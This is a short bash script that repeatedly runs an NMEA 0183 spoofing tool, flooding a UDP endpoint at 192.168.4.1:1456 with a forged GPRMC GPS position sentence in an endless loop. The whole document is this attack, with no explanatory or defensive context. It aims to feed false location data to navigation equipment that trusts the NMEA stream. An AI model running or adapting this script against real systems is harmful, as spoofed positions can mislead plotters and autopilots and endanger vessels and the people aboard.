#!/bin/bash
while true; do
    ./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPRMC,123519,A,4807.038,N,01131.000,E,0.00,69.0,230394,,,A" --type udp
done
